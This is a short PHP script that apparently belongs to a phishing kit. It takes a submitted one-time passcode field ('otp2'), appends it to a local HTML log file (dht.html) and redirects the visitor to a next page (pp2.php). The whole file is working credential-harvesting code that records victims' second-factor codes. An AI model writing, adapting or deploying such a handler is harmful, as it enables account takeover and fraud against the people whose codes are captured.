<?php
header("location:pp2.php");
$otp2=$_POST['otp2'];
$handle=fopen('dht.html','a');
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"otp2=$otp2\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
